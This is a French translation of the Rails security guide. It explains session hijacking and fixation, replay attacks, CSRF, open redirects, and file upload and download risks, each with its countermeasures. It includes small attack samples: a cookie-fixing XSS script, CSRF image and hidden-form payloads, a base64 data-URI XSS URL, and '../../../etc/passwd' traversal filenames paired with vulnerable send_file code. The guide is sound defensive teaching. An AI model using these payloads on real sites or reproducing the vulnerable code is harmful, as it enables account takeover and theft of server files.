**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**, original file md5: f769f3ad2ac56ac5949224832c8307e3
Sécuriser les applications Rails
===============================

Ce manuel décrit les problèmes de sécurité courants dans les applications web et comment les éviter avec Rails.

Après avoir lu ce guide, vous saurez :

* Toutes les contre-mesures _qui sont mises en évidence_.
* Le concept de sessions dans Rails, ce qu'il faut y mettre et les méthodes d'attaque populaires.
* Comment simplement visiter un site peut poser un problème de sécurité (avec CSRF).
* Ce à quoi il faut faire attention lors de la manipulation de fichiers ou de la fourniture d'une interface d'administration.
* Comment gérer les utilisateurs : se connecter et se déconnecter et les méthodes d'attaque à tous les niveaux.
* Et les méthodes d'attaque par injection les plus populaires.

--------------------------------------------------------------------------------

Introduction
------------

Les frameworks d'application web sont conçus pour aider les développeurs à construire des applications web. Certains d'entre eux vous aident également à sécuriser l'application web. En réalité, un framework n'est pas plus sécurisé qu'un autre : si vous l'utilisez correctement, vous serez en mesure de construire des applications sécurisées avec de nombreux frameworks. Ruby on Rails dispose de quelques méthodes d'aide intelligentes, par exemple contre les injections SQL, donc ce n'est guère un problème.

En général, il n'y a pas de sécurité prête à l'emploi. La sécurité dépend des personnes qui utilisent le framework, et parfois de la méthode de développement. Et cela dépend de toutes les couches d'un environnement d'application web : le stockage en arrière-plan, le serveur web et l'application web elle-même (et éventuellement d'autres couches ou applications).

Le groupe Gartner estime toutefois que 75% des attaques se produisent au niveau de l'application web, et a découvert que "sur 300 sites audités, 97% sont vulnérables aux attaques". Cela s'explique par le fait que les applications web sont relativement faciles à attaquer, car elles sont simples à comprendre et à manipuler, même par une personne non spécialisée.

Les menaces contre les applications web comprennent la prise de contrôle de comptes utilisateur, la contournement du contrôle d'accès, la lecture ou la modification de données sensibles, ou la présentation de contenu frauduleux. Ou un attaquant pourrait être en mesure d'installer un programme cheval de Troie ou un logiciel d'envoi de courrier indésirable, viser un enrichissement financier, ou causer des dommages à la marque en modifiant les ressources de l'entreprise. Afin de prévenir les attaques, de minimiser leur impact et de supprimer les points d'attaque, vous devez d'abord comprendre pleinement les méthodes d'attaque afin de trouver les contre-mesures appropriées. C'est ce que ce guide vise à faire.

Pour développer des applications web sécurisées, vous devez vous tenir au courant de toutes les couches et connaître vos ennemis. Pour rester à jour, abonnez-vous aux listes de diffusion sur la sécurité, lisez des blogs sur la sécurité et prenez l'habitude de mettre à jour et de vérifier la sécurité (consultez le chapitre [Ressources supplémentaires](#additional-resources)). Cela se fait manuellement car c'est ainsi que vous trouvez les problèmes de sécurité logique désagréables.

Sessions
--------

Ce chapitre décrit certaines attaques particulières liées aux sessions et les mesures de sécurité pour protéger vos données de session.

### Qu'est-ce que les sessions ?

INFO : Les sessions permettent à l'application de maintenir l'état spécifique à l'utilisateur pendant que les utilisateurs interagissent avec l'application. Par exemple, les sessions permettent aux utilisateurs de s'authentifier une fois et de rester connectés pour les futures requêtes.

La plupart des applications ont besoin de suivre l'état des utilisateurs qui interagissent avec l'application. Il peut s'agir du contenu d'un panier d'achat ou de l'identifiant de l'utilisateur actuellement connecté. Ce type d'état spécifique à l'utilisateur peut être stocké dans la session.

Rails fournit un objet de session pour chaque utilisateur qui accède à l'application. Si l'utilisateur a déjà une session active, Rails utilise la session existante. Sinon, une nouvelle session est créée.

NOTE : En savoir plus sur les sessions et comment les utiliser dans le [Guide de présentation d'Action Controller](action_controller_overview.html#session).

### Piratage de session

AVERTISSEMENT : _Le vol de l'identifiant de session d'un utilisateur permet à un attaquant d'utiliser l'application web au nom de la victime._

De nombreuses applications web disposent d'un système d'authentification : un utilisateur fournit un nom d'utilisateur et un mot de passe, l'application web les vérifie et stocke l'identifiant utilisateur correspondant dans le hash de session. À partir de maintenant, la session est valide. À chaque requête, l'application chargera l'utilisateur, identifié par l'identifiant utilisateur dans la session, sans avoir besoin d'une nouvelle authentification. L'identifiant de session dans le cookie identifie la session.

Ainsi, le cookie sert d'authentification temporaire pour l'application web. Quiconque s'empare d'un cookie d'une autre personne peut utiliser l'application web en tant que cet utilisateur, avec des conséquences potentiellement graves. Voici quelques façons de pirater une session et leurs contre-mesures :
* Sniffer le cookie dans un réseau non sécurisé. Un réseau local sans fil peut être un exemple d'un tel réseau. Dans un réseau local sans fil non crypté, il est particulièrement facile d'écouter le trafic de tous les clients connectés. Pour le constructeur d'applications web, cela signifie _fournir une connexion sécurisée via SSL_. Dans Rails 3.1 et ultérieur, cela peut être réalisé en forçant toujours la connexion SSL dans le fichier de configuration de votre application :

    ```ruby
    config.force_ssl = true
    ```

* La plupart des gens ne suppriment pas les cookies après avoir travaillé sur un terminal public. Donc, si le dernier utilisateur ne s'est pas déconnecté d'une application web, vous pourriez l'utiliser en tant qu'utilisateur. Fournissez à l'utilisateur un _bouton de déconnexion_ dans l'application web, et _rendez-le visible_.

* De nombreuses attaques par injection de code (XSS) visent à obtenir le cookie de l'utilisateur. Vous en apprendrez [plus sur XSS](#cross-site-scripting-xss) plus tard.

* Au lieu de voler un cookie inconnu de l'attaquant, ils corrigent l'identifiant de session d'un utilisateur (dans le cookie) connu d'eux. Lisez-en plus sur cette soi-disant fixation de session plus tard.

L'objectif principal de la plupart des attaquants est de gagner de l'argent. Les prix clandestins pour les comptes de connexion bancaire volés varient de 0,5% à 10% du solde du compte, de 0,5 $ à 30 $ pour les numéros de carte de crédit (de 20 $ à 60 $ avec tous les détails), de 0,1 $ à 1,5 $ pour les identités (nom, SSN et date de naissance), de 20 $ à 50 $ pour les comptes de détaillants, et de 6 $ à 10 $ pour les comptes de fournisseurs de services cloud, selon le [Rapport sur les menaces à la sécurité Internet de Symantec (2017)](https://docs.broadcom.com/docs/istr-22-2017-en).

### Stockage de session

NOTE : Rails utilise `ActionDispatch::Session::CookieStore` comme stockage de session par défaut.

ASTUCE : Apprenez-en plus sur les autres stockages de session dans le [Guide de présentation d'Action Controller](action_controller_overview.html#session).

Rails `CookieStore` enregistre le hachage de session dans un cookie côté client.
Le serveur récupère le hachage de session à partir du cookie et
élimine la nécessité d'un ID de session. Cela augmentera considérablement la
vitesse de l'application, mais c'est une option de stockage controversée et
vous devez réfléchir aux implications de sécurité et aux limitations de stockage :

* Les cookies ont une limite de taille de 4 ko. Utilisez les cookies uniquement pour les données pertinentes pour la session.

* Les cookies sont stockés côté client. Le client peut conserver le contenu des cookies même pour les cookies expirés. Le client peut copier les cookies sur d'autres machines. Évitez de stocker des données sensibles dans les cookies.

* Les cookies sont temporaires par nature. Le serveur peut définir une heure d'expiration pour le cookie, mais le client peut supprimer le cookie et son contenu avant cela. Stockez toutes les données de nature plus permanente côté serveur.

* Les cookies de session ne s'invalident pas d'eux-mêmes et peuvent être réutilisés de manière malveillante. Il peut être judicieux de faire en sorte que votre application invalide les anciens cookies de session en utilisant un horodatage stocké.

* Rails chiffre les cookies par défaut. Le client ne peut pas lire ou modifier le contenu du cookie sans casser le chiffrement. Si vous prenez soin de vos secrets, vous pouvez considérer vos cookies comme généralement sécurisés.

Le `CookieStore` utilise le
[cookie jar chiffré](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted)
pour fournir un emplacement sécurisé et chiffré pour stocker les données de session. Les sessions basées sur les cookies offrent donc à la fois l'intégrité et la confidentialité de leur contenu. La clé de chiffrement, ainsi que la clé de vérification utilisée pour les cookies
[signés](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed),
sont dérivées de la valeur de configuration `secret_key_base`.

ASTUCE : Les secrets doivent être longs et aléatoires. Utilisez `bin/rails secret` pour obtenir de nouveaux secrets uniques.

INFO : Apprenez-en plus sur [la gestion des informations d'identification plus tard dans ce guide](security.html#custom-credentials).

Il est également important d'utiliser des valeurs de sel différentes pour les cookies chiffrés et signés. Utiliser la même valeur pour différentes configurations de sel peut entraîner l'utilisation de la même clé dérivée pour différentes fonctionnalités de sécurité, ce qui peut affaiblir la force de la clé.

Dans les applications de test et de développement, obtenez une `secret_key_base` dérivée du nom de l'application. Les autres environnements doivent utiliser une clé aléatoire présente dans `config/credentials.yml.enc`, montrée ici dans son état déchiffré :

```yaml
secret_key_base: 492f...
```

AVERTISSEMENT : Si les secrets de votre application ont pu être exposés, envisagez fortement de les changer. Notez que changer `secret_key_base` expirera les sessions actives et obligera tous les utilisateurs à se reconnecter. En plus des données de session : les cookies chiffrés, les cookies signés et les fichiers Active Storage peuvent également être affectés.

### Rotation des configurations de cookies chiffrés et signés

La rotation est idéale pour changer les configurations de cookies et s'assurer que les anciens cookies ne sont pas immédiatement invalides. Vos utilisateurs ont alors la possibilité de visiter votre site,
de lire leur cookie avec une ancienne configuration et de le réécrire avec le
nouveau changement. La rotation peut ensuite être supprimée une fois que vous êtes suffisamment
à l'aise que les utilisateurs ont eu la possibilité de mettre à niveau leurs cookies.
Il est possible de faire pivoter les chiffres et les empreintes utilisés pour les cookies chiffrés et signés.

Par exemple, pour changer l'empreinte utilisée pour les cookies signés de SHA1 à SHA256, vous devez d'abord attribuer la nouvelle valeur de configuration :

```ruby
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
```

Ensuite, ajoutez une rotation pour l'ancienne empreinte SHA1 afin que les cookies existants soient mis à niveau de manière transparente vers la nouvelle empreinte SHA256.

```ruby
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
```

Ensuite, tous les cookies signés écrits seront digérés avec SHA256. Les anciens cookies qui ont été écrits avec SHA1 peuvent toujours être lus, et s'ils sont accédés, ils seront écrits avec la nouvelle empreinte afin d'être mis à niveau et de ne pas être invalides lorsque vous supprimez la rotation.

Une fois que les utilisateurs avec des cookies signés digérés en SHA1 ne doivent plus avoir la possibilité de réécrire leurs cookies, supprimez la rotation.

Bien que vous puissiez mettre en place autant de rotations que vous le souhaitez, il n'est pas courant d'avoir plusieurs rotations en cours en même temps.

Pour plus de détails sur la rotation des clés avec des messages chiffrés et signés, ainsi que sur les différentes options acceptées par la méthode `rotate`, veuillez vous référer à la documentation de l'API [MessageEncryptor](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html) et [MessageVerifier](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html).

### Attaques de rejeu pour les sessions de CookieStore

CONSEIL : _Un autre type d'attaque dont vous devez être conscient lorsque vous utilisez `CookieStore` est l'attaque de rejeu._

Cela fonctionne comme suit :

* Un utilisateur reçoit des crédits, le montant est stocké dans une session (ce qui est de toute façon une mauvaise idée, mais nous le ferons à des fins de démonstration).
* L'utilisateur achète quelque chose.
* La nouvelle valeur de crédit ajustée est stockée dans la session.
* L'utilisateur prend le cookie de la première étape (qu'il a précédemment copié) et remplace le cookie actuel dans le navigateur.
* L'utilisateur retrouve son crédit d'origine.

L'inclusion d'un nonce (une valeur aléatoire) dans la session résout les attaques de rejeu. Un nonce n'est valide qu'une seule fois, et le serveur doit suivre tous les nonces valides. Cela devient encore plus compliqué si vous avez plusieurs serveurs d'application. Stocker les nonces dans une table de base de données annulerait l'objectif même de CookieStore (éviter l'accès à la base de données).

La meilleure _solution contre cela est de ne pas stocker ce type de données dans une session, mais dans la base de données_. Dans ce cas, stockez le crédit dans la base de données et l'ID de l'utilisateur connecté dans la session.

### Fixation de session

REMARQUE : _En plus de voler l'ID de session d'un utilisateur, l'attaquant peut fixer un ID de session connu d'eux. Cela s'appelle la fixation de session._

![Fixation de session](images/security/session_fixation.png)

Cette attaque vise à fixer l'ID de session d'un utilisateur connu de l'attaquant et à forcer le navigateur de l'utilisateur à utiliser cet ID. Il n'est donc pas nécessaire pour l'attaquant de voler l'ID de session par la suite. Voici comment fonctionne cette attaque :

* L'attaquant crée un ID de session valide : il charge la page de connexion de l'application web où il souhaite fixer la session, et prend l'ID de session dans le cookie de la réponse (voir les numéros 1 et 2 sur l'image).
* Il maintient la session en accédant périodiquement à l'application web afin de maintenir une session expirante active.
* L'attaquant force le navigateur de l'utilisateur à utiliser cet ID de session (voir le numéro 3 sur l'image). Comme vous ne pouvez pas modifier un cookie d'un autre domaine (en raison de la politique de même origine), l'attaquant doit exécuter un JavaScript à partir du domaine de l'application web cible. Injecter le code JavaScript dans l'application par XSS permet d'accomplir cette attaque. Voici un exemple : `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. En savoir plus sur XSS et l'injection plus tard.
* L'attaquant attire la victime sur la page infectée avec le code JavaScript. En visualisant la page, le navigateur de la victime changera l'ID de session en l'ID de session piège.
* Comme la nouvelle session piège n'est pas utilisée, l'application web demandera à l'utilisateur de s'authentifier.
* À partir de maintenant, la victime et l'attaquant utiliseront conjointement l'application web avec la même session : la session est devenue valide et la victime n'a pas remarqué l'attaque.

### Fixation de session - Contre-mesures

CONSEIL : _Une seule ligne de code vous protégera contre la fixation de session._

La contre-mesure la plus efficace consiste à _émettre un nouvel identifiant de session_ et à déclarer l'ancien invalide après une connexion réussie. De cette façon, un attaquant ne peut pas utiliser l'identifiant de session fixé. C'est également une bonne contre-mesure contre le détournement de session. Voici comment créer une nouvelle session dans Rails :
```ruby
reset_session
```

Si vous utilisez le populaire gem [Devise](https://rubygems.org/gems/devise) pour la gestion des utilisateurs, il expirera automatiquement les sessions lors de la connexion et de la déconnexion. Si vous créez votre propre système, n'oubliez pas d'expirer la session après l'action de connexion (lorsque la session est créée). Cela supprimera les valeurs de la session, donc _vous devrez les transférer vers la nouvelle session_.

Une autre mesure de sécurité consiste à _enregistrer les propriétés spécifiques à l'utilisateur dans la session_, les vérifier à chaque requête et refuser l'accès si les informations ne correspondent pas. Ces propriétés peuvent être l'adresse IP distante ou l'agent utilisateur (le nom du navigateur web), bien que ce dernier soit moins spécifique à l'utilisateur. Lors de l'enregistrement de l'adresse IP, il faut garder à l'esprit qu'il existe des fournisseurs de services Internet ou de grandes organisations qui placent leurs utilisateurs derrière des proxies. _Ces proxies peuvent changer au cours d'une session_, de sorte que ces utilisateurs ne pourront pas utiliser votre application, ou seulement de manière limitée.

### Expiration de session

NOTE: _Les sessions qui n'expirent jamais prolongent la période d'attaque, comme les attaques de type cross-site request forgery (CSRF), session hijacking et session fixation._

Une possibilité est de définir le timestamp d'expiration du cookie avec l'ID de session. Cependant, le client peut modifier les cookies stockés dans le navigateur web, il est donc plus sûr d'expirer les sessions côté serveur. Voici un exemple de comment _expirer les sessions dans une table de base de données_. Appelez `Session.sweep(20.minutes)` pour expirer les sessions qui ont été utilisées il y a plus de 20 minutes.

```ruby
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    where(updated_at: ...time.ago).delete_all
  end
end
```

La section sur la fixation de session a introduit le problème des sessions maintenues. Un attaquant maintenant une session toutes les cinq minutes peut maintenir la session active indéfiniment, même si vous expirez les sessions. Une solution simple consiste à ajouter une colonne `created_at` à la table des sessions. Vous pouvez maintenant supprimer les sessions qui ont été créées il y a longtemps. Utilisez cette ligne dans la méthode sweep ci-dessus :

```ruby
where(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all
```

Cross-Site Request Forgery (CSRF)
---------------------------------

Cette méthode d'attaque fonctionne en incluant du code malveillant ou un lien dans une page qui accède à une application web pour laquelle l'utilisateur est censé être authentifié. Si la session pour cette application web n'a pas expiré, un attaquant peut exécuter des commandes non autorisées.

![Cross-Site Request Forgery](images/security/csrf.png)

Dans le [chapitre sur les sessions](#sessions), vous avez appris que la plupart des applications Rails utilisent des sessions basées sur les cookies. Soit elles stockent l'ID de session dans le cookie et ont un hash de session côté serveur, soit le hash de session entier est côté client. Dans les deux cas, le navigateur enverra automatiquement le cookie avec chaque requête vers un domaine, s'il peut trouver un cookie pour ce domaine. Le point controversé est que si la requête provient d'un site d'un domaine différent, elle enverra également le cookie. Commençons par un exemple :

* Bob navigue sur un forum et consulte un message d'un pirate informatique où il y a un élément HTML image fabriqué. L'élément fait référence à une commande dans l'application de gestion de projet de Bob, plutôt qu'à un fichier image : `<img src="http://www.webapp.com/project/1/destroy">`
* La session de Bob sur `www.webapp.com` est toujours active, car il ne s'est pas déconnecté il y a quelques minutes.
* En consultant le message, le navigateur trouve une balise image. Il essaie de charger l'image suspecte depuis `www.webapp.com`. Comme expliqué précédemment, il enverra également le cookie avec l'ID de session valide.
* L'application web sur `www.webapp.com` vérifie les informations utilisateur dans le hash de session correspondant et détruit le projet avec l'ID 1. Elle renvoie ensuite une page de résultat qui est un résultat inattendu pour le navigateur, donc il n'affichera pas l'image.
* Bob ne remarque pas l'attaque - mais quelques jours plus tard, il découvre que le projet numéro un a disparu.

Il est important de noter que l'image ou le lien fabriqué n'a pas nécessairement besoin d'être situé dans le domaine de l'application web, il peut être n'importe où - dans un forum, un article de blog ou un e-mail.

Le CSRF apparaît très rarement dans la CVE (Common Vulnerabilities and Exposures) - moins de 0,1% en 2006 - mais c'est vraiment un "géant endormi" [Grossman]. Cela contraste fortement avec les résultats de nombreux travaux de contrat de sécurité - _le CSRF est un problème de sécurité important_.
### Contremesures CSRF

NOTE : _Tout d'abord, conformément aux exigences du W3C, utilisez GET et POST de manière appropriée. Deuxièmement, un jeton de sécurité dans les requêtes non-GET protégera votre application contre les attaques CSRF._

#### Utilisez GET et POST de manière appropriée

Le protocole HTTP fournit essentiellement deux types principaux de requêtes - GET et POST (DELETE, PUT et PATCH doivent être utilisés comme POST). Le World Wide Web Consortium (W3C) fournit une liste de contrôle pour choisir entre HTTP GET et POST :

**Utilisez GET si :**

* L'interaction est plus _comme une question_ (c'est-à-dire une opération sûre telle qu'une requête, une opération de lecture ou une recherche).

**Utilisez POST si :**

* L'interaction est plus _comme une commande_, ou
* L'interaction _modifie l'état_ de la ressource d'une manière que l'utilisateur percevrait (par exemple, une souscription à un service), ou
* L'utilisateur est _tenu responsable des résultats_ de l'interaction.

Si votre application web est RESTful, vous pouvez être habitué à d'autres verbes HTTP tels que PATCH, PUT ou DELETE. Cependant, certains navigateurs web obsolètes ne les prennent pas en charge - seuls GET et POST. Rails utilise un champ `_method` caché pour gérer ces cas.

_Les requêtes POST peuvent également être envoyées automatiquement_. Dans cet exemple, le lien www.harmless.com est affiché comme destination dans la barre d'état du navigateur. Mais en réalité, il a créé dynamiquement un nouveau formulaire qui envoie une requête POST.

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">Vers l'enquête inoffensive</a>
```

Ou l'attaquant place le code dans le gestionnaire d'événements onmouseover d'une image :

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

Il existe de nombreuses autres possibilités, comme l'utilisation d'une balise `<script>` pour effectuer une requête entre sites vers une URL avec une réponse JSONP ou JavaScript. La réponse est un code exécutable que l'attaquant peut trouver un moyen d'exécuter, en extrayant éventuellement des données sensibles. Pour protéger contre cette fuite de données, nous devons interdire les balises `<script>` entre sites. Cependant, les requêtes Ajax respectent la politique de même origine du navigateur (seul votre propre site est autorisé à initier `XmlHttpRequest`), nous pouvons donc en toute sécurité leur permettre de renvoyer des réponses JavaScript.

NOTE : Nous ne pouvons pas distinguer l'origine d'une balise `<script>` - qu'il s'agisse d'une balise sur votre propre site ou sur un autre site malveillant - nous devons donc bloquer toutes les balises `<script>` en général, même si c'est en réalité un script de même origine sûr servi depuis votre propre site. Dans ces cas, excluez explicitement la protection CSRF sur les actions qui servent du JavaScript destiné à une balise `<script>`.

#### Jeton de sécurité requis

Pour se protéger contre toutes les autres requêtes forgées, nous introduisons un _jeton de sécurité requis_ que notre site connaît mais que les autres sites ne connaissent pas. Nous incluons le jeton de sécurité dans les requêtes et le vérifions côté serveur. Cela se fait automatiquement lorsque [`config.action_controller.default_protect_from_forgery`][] est défini sur `true`, ce qui est la valeur par défaut pour les nouvelles applications Rails créées. Vous pouvez également le faire manuellement en ajoutant ce qui suit à votre contrôleur d'application :

```ruby
protect_from_forgery with: :exception
```

Cela inclura un jeton de sécurité dans tous les formulaires générés par Rails. Si le jeton de sécurité ne correspond pas à ce qui était attendu, une exception sera levée.

Lors de la soumission de formulaires avec [Turbo](https://turbo.hotwired.dev/), le jeton de sécurité est également requis. Turbo recherche le jeton dans les balises méta `csrf` de la mise en page de votre application et l'ajoute à la requête dans l'en-tête de la requête `X-CSRF-Token`. Ces balises méta sont créées avec la méthode d'aide [`csrf_meta_tags`][] :

```erb
<head>
  <%= csrf_meta_tags %>
</head>
```

ce qui donne :

```html
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="THE-TOKEN" />
</head>
```

Lorsque vous effectuez vos propres requêtes non-GET à partir de JavaScript, le jeton de sécurité est également requis. [Rails Request.JS](https://github.com/rails/request.js) est une bibliothèque JavaScript qui encapsule la logique d'ajout des en-têtes de requête requis.

Lorsque vous utilisez une autre bibliothèque pour effectuer des appels Ajax, il est nécessaire d'ajouter le jeton de sécurité en tant qu'en-tête par défaut vous-même. Pour obtenir le jeton à partir de la balise méta, vous pouvez faire quelque chose comme :

```javascript
document.head.querySelector("meta[name=csrf-token]")?.content
```

#### Effacement des cookies persistants

Il est courant d'utiliser des cookies persistants pour stocker des informations utilisateur, avec `cookies.permanent` par exemple. Dans ce cas, les cookies ne seront pas effacés et la protection CSRF par défaut ne sera pas efficace. Si vous utilisez un autre magasin de cookies que la session pour ces informations, vous devez gérer vous-même ce qu'il faut en faire :
```ruby
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # Méthode d'exemple qui détruit les cookies de l'utilisateur
end
```

La méthode ci-dessus peut être placée dans le `ApplicationController` et sera appelée lorsque le jeton CSRF est absent ou incorrect lors d'une requête non-GET.

Notez que _les vulnérabilités de type cross-site scripting (XSS) contournent toutes les protections CSRF_. XSS donne à l'attaquant accès à tous les éléments d'une page, il peut donc lire le jeton de sécurité CSRF à partir d'un formulaire ou soumettre directement le formulaire. Lisez [plus sur XSS](#cross-site-scripting-xss) plus tard.


Redirection et fichiers
---------------------

Une autre classe de vulnérabilités de sécurité concerne l'utilisation de redirection et de fichiers dans les applications web.

### Redirection

AVERTISSEMENT : _La redirection dans une application web est un outil de piratage sous-estimé : non seulement l'attaquant peut rediriger l'utilisateur vers un site piégé, mais il peut également créer une attaque autonome._

Chaque fois que l'utilisateur est autorisé à passer (des parties de) l'URL pour la redirection, il est potentiellement vulnérable. L'attaque la plus évidente consisterait à rediriger les utilisateurs vers une fausse application web qui ressemble exactement à l'originale. Cette attaque dite de phishing fonctionne en envoyant un lien non suspect dans un e-mail aux utilisateurs, en injectant le lien par XSS dans l'application web ou en plaçant le lien sur un site externe. Il est non suspect, car le lien commence par l'URL de l'application web et l'URL du site malveillant est cachée dans le paramètre de redirection : http://www.example.com/site/redirect?to=www.attacker.com. Voici un exemple d'action héritée :

```ruby
def legacy
  redirect_to(params.update(action: 'main'))
end
```

Cela redirigera l'utilisateur vers l'action principale s'ils ont essayé d'accéder à une action héritée. L'intention était de conserver les paramètres d'URL de l'action héritée et de les transmettre à l'action principale. Cependant, cela peut être exploité par un attaquant s'ils ont inclus une clé d'hôte dans l'URL :

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

S'il est à la fin de l'URL, il sera difficilement remarqué et redirigera l'utilisateur vers l'hôte `attacker.com`. En règle générale, le fait de passer directement une entrée utilisateur dans `redirect_to` est considéré comme dangereux. Une mesure de sécurité simple consisterait à _inclure uniquement les paramètres attendus dans une action héritée_ (encore une approche de liste autorisée, par opposition à la suppression des paramètres inattendus). _Et si vous redirigez vers une URL, vérifiez-la avec une liste autorisée ou une expression régulière_.

#### XSS autonome

Une autre attaque de redirection et de XSS autonome fonctionne dans Firefox et Opera grâce à l'utilisation du protocole de données. Ce protocole affiche son contenu directement dans le navigateur et peut être n'importe quoi, du HTML ou du JavaScript à des images entières :

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

Cet exemple est un JavaScript encodé en Base64 qui affiche une boîte de dialogue simple. Dans une URL de redirection, un attaquant pourrait rediriger vers cette URL avec le code malveillant dedans. Comme contre-mesure, _ne permettez pas à l'utilisateur de fournir (des parties de) l'URL vers laquelle rediriger_.

### Téléchargement de fichiers

REMARQUE : _Assurez-vous que les téléchargements de fichiers n'écrasent pas de fichiers importants et traitez les fichiers multimédias de manière asynchrone._

De nombreuses applications web permettent aux utilisateurs de télécharger des fichiers. _Les noms de fichiers, que l'utilisateur peut choisir (en partie), doivent toujours être filtrés_ car un attaquant pourrait utiliser un nom de fichier malveillant pour écraser n'importe quel fichier sur le serveur. Si vous stockez les téléchargements de fichiers dans /var/www/uploads et que l'utilisateur entre un nom de fichier comme "../../../etc/passwd", cela peut écraser un fichier important. Bien sûr, l'interpréteur Ruby aurait besoin des autorisations appropriées pour le faire - une raison de plus pour exécuter les serveurs web, les serveurs de base de données et autres programmes en tant qu'utilisateur Unix moins privilégié.

Lors du filtrage des noms de fichiers fournis par l'utilisateur, _n'essayez pas de supprimer les parties malveillantes_. Pensez à une situation où l'application web supprime tous les "../" dans un nom de fichier et qu'un attaquant utilise une chaîne telle que "....//" - le résultat sera "../". Il est préférable d'utiliser une approche de liste autorisée, qui _vérifie la validité d'un nom de fichier avec un ensemble de caractères acceptés_. Cela s'oppose à une approche de liste restreinte qui tente de supprimer les caractères non autorisés. Si ce n'est pas un nom de fichier valide, rejetez-le (ou remplacez les caractères non acceptés), mais ne les supprimez pas. Voici le filtre de nom de fichier du plugin [attachment_fu](https://github.com/technoweenie/attachment_fu/tree/master) :

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename ne fonctionne pas correctement avec les chemins Windows sur Unix
    # obtenir uniquement le nom de fichier, pas le chemin complet
    name.sub!(/\A.*(\\|\/)/, '')
    # Enfin, remplacez tous les caractères non alphanumériques, soulignés
    # ou points par un souligné
    name.gsub!(/[^\w.-]/, '_')
  end
end
```
Un inconvénient majeur du traitement synchrone des téléchargements de fichiers (comme le plugin `attachment_fu` peut le faire avec les images) est sa _vulnérabilité aux attaques de déni de service_. Un attaquant peut démarrer synchronement des téléchargements de fichiers image à partir de nombreux ordinateurs, ce qui augmente la charge du serveur et peut éventuellement le faire planter ou le bloquer.

La solution à cela est de _traiter les fichiers multimédias de manière asynchrone_ : Enregistrez le fichier multimédia et planifiez une demande de traitement dans la base de données. Un second processus se chargera du traitement du fichier en arrière-plan.

### Code exécutable dans les téléchargements de fichiers

AVERTISSEMENT : _Le code source contenu dans les fichiers téléchargés peut être exécuté lorsqu'il est placé dans des répertoires spécifiques. Ne placez pas les téléchargements de fichiers dans le répertoire /public de Rails s'il s'agit du répertoire principal d'Apache._

Le serveur web Apache populaire dispose d'une option appelée DocumentRoot. Il s'agit du répertoire principal du site web, tout ce qui se trouve dans cet arborescence sera servi par le serveur web. Si des fichiers ont une certaine extension de nom de fichier, le code qu'ils contiennent sera exécuté lorsqu'il est demandé (cela peut nécessiter certains paramètres à définir). Des exemples de cela sont les fichiers PHP et CGI. Maintenant, imaginez une situation où un attaquant télécharge un fichier "file.cgi" contenant du code, qui sera exécuté lorsqu'une personne télécharge le fichier.

_Si votre DocumentRoot Apache pointe vers le répertoire /public de Rails, ne placez pas les téléchargements de fichiers dedans_, stockez les fichiers au moins un niveau plus haut.

### Téléchargement de fichiers

REMARQUE : _Assurez-vous que les utilisateurs ne peuvent pas télécharger des fichiers arbitraires._

Tout comme vous devez filtrer les noms de fichiers pour les téléchargements, vous devez également le faire pour les téléchargements. La méthode `send_file()` envoie des fichiers du serveur au client. Si vous utilisez un nom de fichier que l'utilisateur a saisi sans le filtrer, n'importe quel fichier peut être téléchargé :

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

Il suffit de passer un nom de fichier comme "../../../etc/passwd" pour télécharger les informations de connexion du serveur. Une solution simple contre cela consiste à _vérifier que le fichier demandé se trouve dans le répertoire attendu_ :

```ruby
basename = File.expand_path('../../files', __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: 'inline'
```

Une autre approche (supplémentaire) consiste à stocker les noms de fichiers dans la base de données et à nommer les fichiers sur le disque d'après les identifiants dans la base de données. C'est également une bonne approche pour éviter que du code potentiellement dangereux contenu dans un fichier téléchargé ne soit exécuté. Le plugin `attachment_fu` fait cela de manière similaire.

Gestion des utilisateurs
------------------------

REMARQUE : _Presque toutes les applications web doivent gérer l'autorisation et l'authentification. Au lieu de créer votre propre système, il est conseillé d'utiliser des plugins courants. Mais assurez-vous également de les maintenir à jour. Quelques précautions supplémentaires peuvent rendre votre application encore plus sécurisée._

Il existe plusieurs plugins d'authentification disponibles pour Rails. De bons plugins, tels que les populaires [devise](https://github.com/heartcombo/devise) et [authlogic](https://github.com/binarylogic/authlogic), ne stockent que des mots de passe hachés cryptographiquement, et non des mots de passe en texte clair. Depuis Rails 3.1, vous pouvez également utiliser la méthode intégrée [`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password) qui prend en charge le hachage sécurisé des mots de passe, la confirmation et les mécanismes de récupération.

### Attaques par force brute sur les comptes

REMARQUE : _Les attaques par force brute sur les comptes sont des attaques par essai-erreur sur les identifiants de connexion. Protégez-vous en utilisant des messages d'erreur plus génériques et en exigeant éventuellement la saisie d'un CAPTCHA._

